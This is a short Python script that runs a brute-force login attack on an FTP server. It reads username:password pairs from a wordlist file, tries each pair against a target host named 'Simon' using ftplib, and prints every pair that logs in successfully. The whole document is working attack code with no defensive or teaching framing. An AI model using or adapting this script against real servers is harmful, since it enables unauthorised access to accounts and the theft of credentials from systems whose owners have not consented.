import ftplib

def brute_force(hostname, pass_file):
    pass_list = open(pass_file, 'r')
    for line in pass_list.readlines():
        username = line.split(':')[0]
        password = line.split(":")[1].strip('\r').strip('\n')
        print(f'Username: {username} and Password: {password}')
        try:
            ftp_server = ftplib.FTP(hostname)
            ftp_server.login(username, password)
            print(f'Successfully Loged In with Username: {username} and Password: {password}')
            ftp_server.quit()
        except:
            print('Could Not Connect')

if __name__ == "__main__":
    hostname = 'Simon'
    path = "Passwords\passwords_ftp.txt"
    brute_force(hostname, path)